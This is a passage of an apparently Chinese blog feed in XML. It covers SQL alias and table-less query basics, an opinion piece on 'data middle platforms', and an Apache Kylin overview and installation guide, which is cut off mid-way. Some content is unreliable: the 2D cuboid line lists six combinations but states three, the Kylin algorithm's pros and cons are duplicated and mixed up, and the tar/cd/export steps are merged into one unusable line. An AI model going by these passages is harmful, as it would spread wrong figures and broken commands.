class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> e.emp_name <span class="keyword">AS</span> <span class="string">"姓名"</span>,</span><br><span class="line">       salary * <span class="number">12</span> <span class="keyword">AS</span> <span class="string">"工资"</span>,</span><br><span class="line">       <span class="keyword">UPPER</span>(email) <span class="string">"电子邮箱"</span></span><br><span class="line"><span class="comment">/* 备注：SQL 别名使用示例</span></span><br><span class="line"><span class="comment">   作者：TonyDong</span></span><br><span class="line"><span class="comment">   日期：2019-11-01</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="keyword">FROM</span> employee <span class="keyword">AS</span> e;</span><br></pre></td></tr></table></figure><blockquote><p>MySQL中的 # 也可以用于表示单行注释。</p></blockquote><p>在 SQL 中，SELECT … FROM … 是最基本的查询形式；但是，有时候我们会看到一种更简单的查询：只有 SELECT 子句，没有 FROM 子句的查询。</p><h3 id="无表查询"><a href="#无表查询" class="headerlink" title="无表查询"></a>无表查询</h3><p>以下查询没有 FROM 子句，用于计算一个表达式的值：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- MySQL、SQL Server 以及 PostgreSQL 实现</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">1+1|</span><br><span class="line"><span class="comment">---|</span></span><br><span class="line">  2|</span><br></pre></td></tr></table></figure><p>这种形式的查询语句通常用于快速查找信息，或者当作计算器使用。但是需要注意的是这种语法并不属于 SQL 标准，而是数据库产品自己的扩展。MySQL、SQL Server 以及 PostgreSQL 都支持无表查询；对于 Oracle 而言，可以使用以下等价的形式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Oracle 实现</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>+<span class="number">1</span></span><br><span class="line">  <span class="keyword">FROM</span> dual;</span><br><span class="line"></span><br><span class="line">1+1|</span><br><span class="line"><span class="comment">---|</span></span><br><span class="line">  2|</span><br></pre></td></tr></table></figure><p>dual 是 Oracle 中的一个特殊的表；它只有一个字段且只包含一行数据，就是为了方便快速查询信息。另外，MySQL 也提供了 dual 表。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本篇我们学习了如何使用 SELECT 和 FROM 查询表中的数据，通过投影操作获取指定的字段信息。SQL 不仅仅能够查询表中的数据，还可以返回算术运算、函数和表达式的结果。在许多数据库中，不包含 FROM 子句的无表查询可以用于快速获取信息。另外，别名和注释都可以让我们编写的 SQL 语句更易阅读和理解。</p><p><strong>练习题</strong>：查询部门表（department）和职位表（job）中的数据，熟悉它们的字段结构和内容。</p><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ul><li><a href="https://www.sqlstyle.guide/zh/" target="_blank" rel="noopener">SQL 编程风格指南</a>。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SQL是一项重要的技能，可能是普通程序员在工作中最常用的。面试的时候造飞机大炮，最后可能还是得实实在在得写SQL。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/bec9bff2ly1g9cm9vd6brj20sg09hq9w.jpg&quot; alt=&quot;SQL-1024x341.png&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="GitChat" scheme="http://yoursite.com/categories/GitChat/"/>
    
    
      <category term="SQL" scheme="http://yoursite.com/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>数据中台是什么</title>
    <link href="http://yoursite.com/2019/11/12/%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%8F%B0%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/"/>
    <id>http://yoursite.com/2019/11/12/数据中台是什么？/</id>
    <published>2019-11-12T03:17:31.173Z</published>
    <updated>2019-11-12T09:05:02.828Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>数据中台是什么？能发挥什么作用？</p><p>对最近很火的数据中台一些思考。</p></blockquote><a id="more"></a> <h1 id="数据中台是什么？"><a href="#数据中台是什么？" class="headerlink" title="数据中台是什么？"></a>数据中台是什么？</h1><h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><p>2015年全年产生的数据量等于历史上所有人类产生数据的总和，人类的数据增长正式从乘法型增长变成了指数型增长，海量数据处理成为了全人类的挑战。</p><p>阿里提出了DT时代已经到来：DataTech替代ITTech，强调数据驱动的重要性。</p><p>阿里走在了前面，阿里用几百人的团队支撑了几万亿的GMV，其中60%-70%来源于数据支持的机器决策，机器智能赋能业务，用更低的成本，更高的效率去服务顾客，提供个性化推荐。</p><p>阿里的数据处理经理了四个阶段，分别是：</p><p>一、数据库阶段，主要是OLTP（联机事务处理）的需求；</p><p>二、数据仓库阶段，OLAP（联机分析处理）成为主要需求；</p><p>三、数据平台阶段，主要解决BI和报表需求的技术问题；</p><p>四、数据中台阶段，通过系统来对接OLTP（事务处理）和OLAP（报表分析）的需求，强调数据业务化的能力。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8v3ih8b6lj22ii1qi7aa.jpg" alt="undefined"></p><p>第一个阶段到第二阶段很好理解，数据库阶段，简单的OLTP（OLTP强调高并发，单条数据简单提取和战士，后者对并发的要求并不高，后者是地并发，大批量，面向分析。）</p><p>第一次转型就是从数据库阶段走到了数据仓库的阶段。互联网数据里面数据量最大的是网页日志，90%以上的数据是非结构化数据，数据量已经到了TB界别，针对分析需求，诞生了数据仓库（DW），阿里的第一个DW是Oracle RAC搭建了DW，这个阶段DW支持的主要久食BI和报表需求。数据库这是也在从传统CB转向分布式DB。</p><p>第二次转型就是从数据仓库阶段到数据平台阶段，这个阶段解决的 还是BI和报表需求，但是主要是在解决底层的技术问题。也即是数据库架构设计问题。</p><p>第二次转型是数据从TB阶段走向了PB级别， Oracle RAC是基于IOE架构的，所有数据用同一个EMC存储。在海量数据处理上，IOE架构有天然的限制，不适合未来的发展。阿里巴巴的第一个数据仓库就是建立在Oracle RAC上，由于数据量增长太快，所以很快就到达20个节点，当时是全亚洲最大的Oracle RAC集群，但阿里巴巴早年算过一笔账，如果仍然沿用IOE架构，那么几年后，阿里的预计营收还远远赶不上服务器的支出费用，就是说，如果不去IOE，阿里会破产。  Shared Nothing的代表就是Hadoop。Hadoop的各个处理单元都有自己私有的存储单元和处理单元， Shared Everything一般是针对单个主机，完全透明共享CPU/MEMORY/IO，并行处理能力是最差的，典型的代表SQLServer。</p><p>所以第二次转型关键词就是去IOE，建立Shared Nothing的海量数据平台来解决数据存储成本增长过快的问题，在阿里巴巴，前期是Hadoop，后期转向自研的ODPS。</p><p>第四阶段就是数据中台服务，这个阶段的特征是数据量的指数级增长，从PB级别到了EB级别，未来会到什么级别，还不好说。</p><p>目前互联网是主力，15年之后，视图声数据指数级增长，未来90%的数据可能都是非结构化数据，这些数据需要CV等技术的解析，5G技术发展，可能会进一步方法数据的体量。</p><p>另一方面，从业务来看，数据也好，数据分析也好，最终都是要为了业务服务，也就是说，要在系统层面能把OLAP和OLTP去做对接，这个对接不能靠人来完成，要靠智能算法。</p><p>目前的数据中台，最底下的数据平台还是偏技术，是中台技术方案中的一个组件，主要解决数据存储和计算，上面是数据服务层，数据服务层通过服务化API能够把数据平台和前台的业务层对接；数据中台里面就没有人的事情，直接系统去做对接，通过智能算法，能把前台的分析需求和交易需求去做对接，最终赋能业务。 </p><p>未来的数据中台，一定是「AI驱动的数据中台」，这个中台包括「计算平台+算法模型+智能硬件」，不仅要在端上具备视觉数据的收集和分析能力，而且还要能通过Face ID，帮助企业去打通业务数据，最终建立线上线下触达和服务消费者的能力。</p><p>真正做到「一切业务数据化，一切数据业务化」。</p><p>数据中台需要三种能力：</p><p>数据模型能力，AI算法模型能力，行业的应用能力。</p><h2 id="Ex"><a href="#Ex" class="headerlink" title="Ex."></a>Ex.</h2><p><strong>阿里中台全景图</strong></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8v7cv7jsfj21b50ka121.jpg" alt="1.png"></p><p><strong>基础设施服务</strong>，即IAAS层，提供硬件底层支持。</p><p><strong>基础服务层</strong>，即PAAS层，包括分布式服务框架、分布式数据库、分布式消息、分布式存储、分布式事务、实时监控服务等等。</p><p><strong>互联网业务中台</strong>，包括各服务中心的抽象出来的各种业务能力，包括交易中心、支付中心、营销中心、结算中心、用户中心、账户中心等等。也包括非业务类服务，如日志分析中心、配置中心、序列中心、基础中心。</p><p><strong>业务应用</strong>，经过调取业务中台，组装形成独立业务服务能力的业务应用。</p><p><strong>交易来源</strong>，就是前台用户使用的各个端，如淘宝App、PC站等。</p><p>数据量超EB，表数量超过百万。</p><p>PPT小结：</p><p><strong>1、阿里业务中台架构图。</strong>阿里完整前后中台技术架构图。</p><p><strong>2、业务中台化-产品形态。</strong>将商业基础形态和逻辑梳理出来，解构成业务“积木块”。</p><p><strong>3、业务中台化-全局架构。</strong>建立中台的中心化控制单元，对中台有一个纵观全局的视图。</p><p><strong>4、业务中台化 - 业务创新和智能化。</strong>业务中台化，汇集和沉淀业务逻辑和数据，对快速创新提供支持。</p><p><strong>5、阿里核心业务架构。</strong>小前台、大中台、轻后台的相互支撑体系。</p><p><strong>6、阿里数据中台架构。</strong>数据中台建设理论、方法和实践。</p><p><strong>7、阿里技术全栈全景图。</strong>阿里的移动中台、业务中台、数据中台、技术中台。</p><p><strong>8、阿里技术平台底座。</strong>阿里多年技术积累和沉淀，构建在阿里云之上。</p><p><strong>9、阿里中台组织架构。</strong>阿里的中台战略，相匹配的组织架构升级。</p><p><strong>10、业务中台建设路径。</strong>企业中台建设应遵循的3个步骤：决心变革、成功试点、持续融合。</p><p><strong>11、企业中台战略4个升级。</strong>从战略、组织、流程、技术四个方面进行升级。</p><p><strong>12、阿里中台的能力开放。</strong>基于阿里云、ET大脑、业务&amp;数据双中台的能力开放。</p><p><strong>13、阿里业务中台建设方法论。</strong>中台建设和基础协议、中心化操控单元。</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>中台这个概念被炒作的恨火，然而究竟什么是中台，似乎并没有人给出一个明确的定义。</p><p>有的人把技术集成平台叫中台，都感觉很片面。</p><p>我查阅了很多资料，中台像业务发展遇到某一瓶颈的时候，为了解决实际问题提出的解决方案。</p><p>2018年9月，腾讯宣布组织架构调整，在原有七大事业部重新组织机构， 新成立了云与智慧产业事业群（CSIG）、平台与内容事业群（PCG），调整为新的6大事业群。而6大事业群紧紧围绕的，正是技术委员会充当“技术中台”角色。 </p><p> 同年12月18日，百度集团进行了一次大的架构调整，由百度创始人、董事长李彦宏发信宣布：”百度将打造AI时代最领先的技术平台，实现前端业务和技术平台的资源高效统筹及组织全面协同。” </p><p> 3天后的12月21日，京东集团人力资源部发布关于京东商城组织架构调整的公告，公告内容称：“在新的组织架构下，京东商城将围绕以客户为中心，划分为前中后台。中台为前台业务运营和创新提供专业能力的共享平台职能。” </p><p>建设方法：</p><p>阿里：业务数据双中台；移动中台；技术中台。</p><p>腾讯：业务中台和数据中台。</p><p>百度：搜索中台</p><p>京东：数据中台</p><p>阿里数据中台概念提出这么久了，我看了这么多资料，对中台的定义大多是一家之言，我个人观点：中台是阿里为了两个目的提出来的概念，第一个目标是大企业的尾大不掉，第二点是数据驱动价值。</p><p>第二点在电商领域的价值已经不用多提，第一点可能是他觉得阿里必须要克服的问题。</p><p>说实话，具体的落地可能都还在摸索之中，先把这个概念拿出来炒作挺离谱的。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;数据中台是什么？能发挥什么作用？&lt;/p&gt;
&lt;p&gt;对最近很火的数据中台一些思考。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Thought" scheme="http://yoursite.com/categories/Thought/"/>
    
    
      <category term="Thought" scheme="http://yoursite.com/tags/Thought/"/>
    
  </entry>
  
  <entry>
    <title>Apache Kylin</title>
    <link href="http://yoursite.com/2019/11/12/Kylin/"/>
    <id>http://yoursite.com/2019/11/12/Kylin/</id>
    <published>2019-11-12T02:19:25.098Z</published>
    <updated>2019-11-22T10:21:34.943Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Kylin是在Hadoop上的SQL层，最近对Phoenix调研完成之后，对Kylin产生了兴趣。</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8v1qog93xj209d08laa6.jpg" alt="undefined"></p><a id="more"></a> <h1 id="Kylin"><a href="#Kylin" class="headerlink" title="Kylin"></a>Kylin</h1><h2 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 概述"></a>第一章 概述</h2><h3 id="1-1-Kylin定义"><a href="#1-1-Kylin定义" class="headerlink" title="1.1 Kylin定义"></a>1.1 Kylin定义</h3><p>Apache Kylin是一个开源的分布式分析引擎，提供Hadoop/Spark之上的SQL查询接口及多维分析（OLAP）能力以支持超大规模数据，最初由eBay Inc开发并贡献至开源社区。它能在亚秒内查询巨大的Hive表。</p><h3 id="1-2-Kylin特点"><a href="#1-2-Kylin特点" class="headerlink" title="1.2 Kylin特点"></a>1.2 Kylin特点</h3><p>Kylin的主要特点包括支持SQL接口、支持超大规模数据集、亚秒级响应、可伸缩性、高吞吐率、BI工具集成等。</p><p>1）标准SQL接口：Kylin是以标准的SQL作为对外服务的接口。</p><p>2）支持超大数据集：Kylin对于大数据的支撑能力可能是目前所有技术中最为领先的。早在2015年eBay的生产环境中就能支持百亿记录的秒级查询，之后在移动的应用场景中又有了千亿记录秒级查询的案例。</p><p>3）亚秒级响应：Kylin拥有优异的查询相应速度，这点得益于预计算，很多复杂的计算，比如连接、聚合，在离线的预计算过程中就已经完成，这大大降低了查询时刻所需的计算量，提高了响应速度。</p><p>4）可伸缩性和高吞吐率：单节点Kylin可实现每秒70个查询，还可以搭建Kylin的集群。</p><p>5）BI工具集成</p><p>Kylin可以与现有的BI工具集成，具体包括如下内容。</p><p>ODBC：与Tableau、Excel、PowerBI等工具集成</p><p>JDBC：与Saiku、BIRT等Java工具集成</p><p>Restate：与JavaScript、Web网页集成</p><p>Kylin开发团队还贡献了<strong>Stippling</strong>的插件，也可以使用Stippling来访问Kylin服务。</p><h3 id="1-3-Kylin架构"><a href="#1-3-Kylin架构" class="headerlink" title="1.3 Kylin架构"></a>1.3 Kylin架构</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8v1uuzn2pj215o0k5ta3.jpg" alt="undefined"></p><p>1）REST Server</p><p>REST Server是一套面向应用程序开发的入口点，旨在实现针对Kylin平台的应用开发工作。 此类应用程序可以提供查询、获取结果、触发cube构建任务、获取元数据以及获取用户权限等等。另外可以通过Restful接口实现SQL查询。</p><p>2）查询引擎（Query Engine）</p><p>当cube准备就绪后，查询引擎就能够获取并解析用户查询。它随后会与系统中的其它组件进行交互，从而向用户返回对应的结果。 </p><p>3）Routing</p><p>负责将解析的SQL生成的执行计划转换成cube缓存的查询，cube是通过预计算缓存在hbase中，这部分查询可以在秒级设置毫秒级完成，而且还有一些操作使用过的查询原始数据（存储在Hadoop的hdfs中通过hive查询）。这部分查询延迟较高。</p><p>4）元数据管理工具（Metadata）</p><p>Kylin是一款元数据驱动型应用程序。元数据管理工具是一大关键性组件，用于对保存在Kylin当中的所有元数据进行管理，其中包括最为重要的cube元数据。其它全部组件的正常运作都需以元数据管理工具为基础。 Kylin的元数据存储在hbase中。 </p><p>5）任务引擎（Cube Build Engine）</p><p>这套引擎的设计目的在于处理所有离线任务，其中包括shell脚本、Java API以及Map Reduce任务等等。任务引擎对Kylin当中的全部任务加以管理与协调，从而确保每一项任务都能得到切实执行并解决其间出现的故障。</p><h3 id="1-4-Kylin工作原理"><a href="#1-4-Kylin工作原理" class="headerlink" title="1.4 Kylin工作原理"></a>1.4 Kylin工作原理</h3><p>Apache Kylin的工作原理本质上是MOLAP（Multidimension On-Line Analysis Processing）Cube，也就是多维立方体分析。是数据分析中非常经典的理论，下面对其做简要介绍。</p><h4 id="1-4-1-纬度和度量"><a href="#1-4-1-纬度和度量" class="headerlink" title="1.4.1 纬度和度量"></a>1.4.1 纬度和度量</h4><p>维度：即观察数据的角度。比如员工数据，可以从性别角度来分析，也可以更加细化，从入职时间或者地区的维度来观察。维度是一组离散的值，比如说性别中的男和女，或者时间维度上的每一个独立的日期。因此在统计时可以将维度值相同的记录聚合在一起，然后应用聚合函数做累加、平均、最大和最小值等聚合计算。</p><p>度量：即被聚合（观察）的统计值，也就是聚合运算的结果。比如说员工数据中不同性别员工的人数，又或者说在同一年入职的员工有多少。</p><p>基数：某个维度的种类数。比如说性别维度，基数为2（男和女）。按照某个维度进行聚合，结果数据的大小主要取决于该维度的基数。</p><h4 id="1-4-2-Cube和Cuboid"><a href="#1-4-2-Cube和Cuboid" class="headerlink" title="1.4.2 Cube和Cuboid"></a>1.4.2 Cube和Cuboid</h4><p>有了维度跟度量，一个数据或数据模型上的所有字段就可以分类了，他们要么是纬度要么是度量（可以被聚合）。于是就有了根据维度和度量做预计算的理论。</p><p>给定一个数据模型，我们可以对其上的所有维度进行聚合，对于N个维度来说，组合的所有可能性共有2^n种。对于每一种维度的组合，将度量值做聚合计算，然后将结果保存为一个物化视图，称为Cuboid。所有维度组合的Cuboid作为一个整体，称为Cube。</p><p>下面举一个简单的例子说明，假设有一个电商的销售数据集，其中维度包括时间[time]、商品[item]、地区[location]和供应商[supplier]，度量为销售额。那么所有维度的组合就有2^4 = 16种，如下图所示：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8v2nn4skoj20hq0db75f.jpg" alt="undefined"></p><p>一维度（1D）的组合有：[time]、[item]、[location]和[supplier]4种；</p><p>二维度（2D）的组合有：[time, item]、[time, location]、[time, supplier]、[item, location]、[item, supplier]、[location, supplier]3种；</p><p>三维度（3D）的组合也有4种；</p><p>最后还有零维度（0D）和四维度（4D）各有一种，总共16种。</p><p>注意：每一种维度组合就是一个Cuboid，16个Cuboid整体就是一个Cube。</p><h4 id="1-4-3-核心算法"><a href="#1-4-3-核心算法" class="headerlink" title="1.4.3 核心算法"></a>1.4.3 核心算法</h4><p>Kylin的工作原理就是对数据模型做Cube预计算，并利用计算的结果加速查询：</p><p>1）指定数据模型，定义维度和度量；</p><p>2）预计算Cube，计算所有Cuboid并保存为物化视图；</p><p>预计算过程是Kylin从Hive中读取原始数据，按照我们选定的维度进行计算，并将结果集保存到Hbase中，默认的计算引擎为MapReduce，可以选择Spark作为计算引擎。一次build的结果，我们称为一个Segment。构建过程中会涉及多个Cuboid的创建，具体创建过程由kylin.cube.algorithm参数决定，参数值可选 auto，layer 和 inmem， 默认值为 auto，即 Kylin 会通过采集数据动态地选择一个算法 (layer or inmem)，如果用户很了解 Kylin 和自身的数据、集群，可以直接设置喜欢的算法。</p><p>3）执行查询，读取Cuboid，运行，产生查询结果。</p><h5 id="1-4-3-1-逐层构建算法"><a href="#1-4-3-1-逐层构建算法" class="headerlink" title="1.4.3.1 逐层构建算法"></a>1.4.3.1 逐层构建算法</h5><p>我们知道，一个N维的Cube，是由1个N维子立方体、N个(N-1)维子立方体、N*(N-1)/2个(N-2)维子立方体、……、N个1维子立方体和1个0维子立方体构成，总共有2^N个子立方体组成，在逐层算法中，按维度数逐层减少来计算，每个层级的计算（除了第一层，它是从原始数据聚合而来），是基于它上一层级的结果来计算的。比如，[Group by A, B]的结果，可以基于[Group by A, B, C]的结果，通过去掉C后聚合得来的；这样可以减少重复计算；当 0维度Cuboid计算出来的时候，整个Cube的计算也就完成了。每一轮的计算都是一个MapReduce任务，且串行执行；一个N维的Cube，至少需要N+1次MapReduce Job。</p><p><strong>算法优点</strong>：</p><p>每一轮的计算都是一个MapReduce任务，且串行执行；一个N维的Cube，至少需要N+1次MapReduce Job。2）受益于Hadoop的日趋成熟，此算法对集群要求低，运行稳定；在内部维护Kylin的过程中，很少遇到在这几步出错的情况；即便是在Hadoop集群比较繁忙的时候，任务也能完成。</p><p>算法缺点</p><p>2）受益于Hadoo    p的日趋成熟，此算法对集群要求低，运行稳定；在内部维护Kylin的过程中，很少遇到在这几步出错的情况；即便是在Hadoop集群比较繁忙的时候，任务也能完成。</p><p><strong>算法缺点：</strong></p><p>1）当Cube有比较多维度的时候，所需要的MapReduce任务也相应增加；由于Hadoop的任务调度需要耗费额外资源，特别是集群较庞大的时候，反复递交任务造成的额外开销会相当可观；</p><p>2）此算法会对Hadoop MapReduce输出较多数据; 虽然已经使用了Combiner来减少从Mapper端到Reducer端的数据传输，所有数据依然需要通过Hadoop MapReduce来排序和组合才能被聚合，无形之中增加了集群的压力;</p><p>3）对HDFS的读写操作较多：由于每一层计算的输出会用做下一层计算的输入，这些Key-Value需要写到HDFS上；当所有计算都完成后，Kylin还需要额外的一轮任务将这些文件转成HBase的HFile格式，以导入到HBase中去；</p><p>总体而言，该算法的效率较低，尤其是当Cube维度数较大的时候。</p><h4 id="1-4-3-2-快速构建算法（inmem）"><a href="#1-4-3-2-快速构建算法（inmem）" class="headerlink" title="1.4.3.2 快速构建算法（inmem）"></a>1.4.3.2 快速构建算法（inmem）</h4><p>也被称作“逐段”(By Segment) 或“逐块”(By Split) 算法，从1.5.x开始引入该算法，利用Mapper端计算先完成大部分聚合，再将聚合后的结果交给Reducer，从而降低对网络瓶颈的压力。该算法的主要思想是，对Mapper所分配的数据块，将它计算成一个完整的小Cube 段（包含所有Cuboid）；每个Mapper将计算完的Cube段输出给Reducer做合并，生成大Cube，也就是最终结果；如图所示解释了此流程。</p><p>与旧算法相比，快速算法主要有两点不同：</p><p>1） Mapper会利用内存做预聚合，算出所有组合；Mapper输出的每个Key都是不同的，这样会减少输出到Hadoop MapReduce的数据量；</p><p>2）一轮MapReduce便会完成所有层次的计算，减少Hadoop任务的调配。</p><h2 id="第二章：Kylin安装指南"><a href="#第二章：Kylin安装指南" class="headerlink" title="第二章：Kylin安装指南"></a>第二章：Kylin安装指南</h2><h3 id="2-1安装地址"><a href="#2-1安装地址" class="headerlink" title="2.1安装地址"></a>2.1安装地址</h3><p>1.官网地址：</p><p><a href="http://kylin.apache.org/cn/" target="_blank" rel="noopener">http://kylin.apache.org/cn/</a></p><p>2.官方文档</p><p><a href="http://kylin.apache.org/cn/docs/" target="_blank" rel="noopener">http://kylin.apache.org/cn/docs/</a></p><p>3.下载地址</p><p><a href="http://kylin.apache.org/cn/download/" target="_blank" rel="noopener">http://kylin.apache.org/cn/download/</a></p><h3 id="2-2-软件要求"><a href="#2-2-软件要求" class="headerlink" title="2.2 软件要求"></a>2.2 软件要求</h3><ul><li><p>Hadoop: 2.7+, 3.1+ (since v2.5)</p></li><li><p>Hive: 0.13 - 1.2.1+</p></li><li><p>HBase: 1.1+, 2.0 (since v2.5)</p></li><li><p>Spark (可选) 2.3.0+</p></li><li><p>Kafka (可选) 1.0.0+ (since v2.5)</p></li><li><p>JDK: 1.8+ (since v2.5)</p></li><li><p>OS: Linux only, CentOS 6.5+ or Ubuntu 16.0.4+</p></li></ul><p>官网提示：在 Hortonworks HDP 2.2-2.6 and 3.0, Cloudera CDH 5.7-5.11 and 6.0, AWS EMR 5.7-5.10, Azure HDInsight 3.5-3.6 上测试通过。</p><h3 id="2-3-硬件要求："><a href="#2-3-硬件要求：" class="headerlink" title="2.3 硬件要求："></a>2.3 硬件要求：</h3><p>运行 Kylin 的服务器的最低配置为 4 core CPU，16 GB 内存和 100 GB 磁盘。 对于高负载的场景，建议使用 24 core CPU，64 GB 内存或更高的配置。</p><h3 id="2-4-Hadoop环境"><a href="#2-4-Hadoop环境" class="headerlink" title="2.4 Hadoop环境"></a>2.4 Hadoop环境</h3><p>Kylin依赖于Hadoop集群处理大量的数据集。需要准备一个配置好HDFS，YARN，MapReduce,，Hive，HBase，Zookeeper和其他服务的Hadoop 集群供 Kylin 运行。<br>   Kylin可以在 Hadoop 集群的任意节点上启动。方便起见，可以在master节点上运行Kylin。但为了更好的稳定性，官网建议将Kylin部署在一个干净的Hadoop client节点上，该节点上 Hive，HBase，HDFS 等命令行已安装好且client 配置（如 <code>core-site.xml</code>，<code>hive-site.xml</code>，<code>hbase-site.xml</code>及其他）也已经合理的配置且其可以自动和其它节点同步。</p><p>运行Kylin的Linux账户要有访问 Hadoop 集群的权限，包括创建/写入 HDFS 文件夹，Hive表，HBase 表和提交MapReduce任务的权限。</p><h3 id="2-5-Kylin安装"><a href="#2-5-Kylin安装" class="headerlink" title="2.5 Kylin安装"></a>2.5 Kylin安装</h3><ol><li>从 <a href="https://kylin.apache.org/download/" target="_blank" rel="noopener">Apache Kylin下载网站</a> 下载一个适用于您 Hadoop 版本的二进制文件。例如，适用于 HBase 1.x 的 Kylin 2.5.0 可通过如下命令行下载得到：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/</span><br><span class="line">wget http://mirror.bit.edu.cn/apache/kylin/apache-kylin-2.5.0/apache-kylin-2.5.0-bin-hbase1x.tar.gz</span><br></pre></td></tr></table></figure><ol><li>解压 tar 包，配置环境变量 <code>$KYLIN_HOME</code> 指向 Kylin 文件夹。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf apache-kylin-2.5.0-bin-hbase1x.tar.gzcd apache-kylin-2.5.0-bin-hbase1xexport KYLIN_HOME=`pwd`</span><br></pre></td></tr></table></figure><p>从 v2.6.1 开始， Kylin 不再包含 Spark 二进制包; 您需要另外下载 Spark，然后设置 <code>SPARK_HOME</code> 系统变量到 Spark 安装目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export SPARK_HOME=/path/to/spark</span><br></pre></td></tr></table></figure><p>或者使用脚本下载:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$KYLIN_HOME/bin/download-spark.sh</span><br></pre></td></tr></table></figure><h4 id="Kylin-tarball-目录"><a href="#Kylin-tarball-目录" class="headerlink" title="Kylin tarball 目录"></a>Kylin tarball 目录</h4><ul><li><code>bin</code>: shell 脚本，用于启动/停止 Kylin，备份/恢复 Kylin 元数据，以及一些检查端口、获取 Hive/HBase 依赖的方法等；</li><li><code>conf</code>: Hadoop 任务的 XML 配置文件</li><li><code>lib</code>: 供外面应用使用的 jar 文件，例如 Hadoop 任务 jar, JDBC 驱动, HBase coprocessor 等.</li><li><code>meta_backups</code>: 执行 <code>bin/metastore.sh     backup</code> 后的默认的备份目录;</li><li><code>sample_cube</code> 用于创建样例 Cube 和表的文件。</li><li><code>spark</code>: 自带的 spark。</li><li><code>tomcat</code>: 自带的 tomcat，用于启动 Kylin 服务。</li><li><code>tool</code>: 用于执行一些命令行的jar文件。</li></ul><h4 id="检查运行环境"><a href="#检查运行环境" class="headerlink" title="检查运行环境"></a>检查运行环境</h4><p>Kylin 运行在 Hadoop 集群上，对各个组件的版本、访问权限及 CLASSPATH 等都有一定的要求，为了避免遇到各种环境问题，您可以运行 <code>$KYLIN_HOME/bin/check-env.sh</code> 脚本来进行环境检测，如果您的环境存在任何的问题，脚本将打印出详细报错信息。如果没有报错信息，代表您的环境适合 Kylin 运行。</p><h4 id="启动-Kylin"><a href="#启动-Kylin" class="headerlink" title="启动 Kylin"></a>启动 Kylin</h4><p>运行 <code>$KYLIN_HOME/bin/kylin.sh start</code> 脚本来启动 Kylin，界面输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Retrieving hadoop conf dir...</span><br><span class="line">KYLIN_HOME is set to /usr/local/apache-kylin-2.5.0-bin-hbase1x</span><br><span class="line">......</span><br><span class="line">A new Kylin instance is started by root. To stop it, run &apos;kylin.sh stop&apos;</span><br><span class="line">Check the log at /usr/local/apache-kylin-2.5.0-bin-hbase1x/logs/kylin.log</span><br><span class="line">Web UI is at http://&lt;hostname&gt;:7070/kylin</span><br></pre></td></tr></table></figure><h4 id="使用-Kylin"><a href="#使用-Kylin" class="headerlink" title="使用 Kylin"></a>使用 Kylin</h4><p>Kylin 启动后您可以通过浏览器 <code>http://:7070/kylin</code> 进行访问。<br> 其中 <code></code> 为具体的机器名、IP 地址或域名，默认端口为 7070。<br> 初始用户名和密码是 <code>ADMIN/KYLIN</code>。<br> 服务器启动后，您可以通过查看 <code>$KYLIN_HOME/logs/kylin.log</code> 获得运行时日志。</p><h4 id="停止-Kylin"><a href="#停止-Kylin" class="headerlink" title="停止 Kylin"></a>停止 Kylin</h4><p>运行 <code>$KYLIN_HOME/bin/kylin.sh stop</code> 脚本来停止 Kylin，界面输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Retrieving hadoop conf dir...</span><br><span class="line">KYLIN_HOME is set to /usr/local/apache-kylin-2.5.0-bin-hbase1x</span><br><span 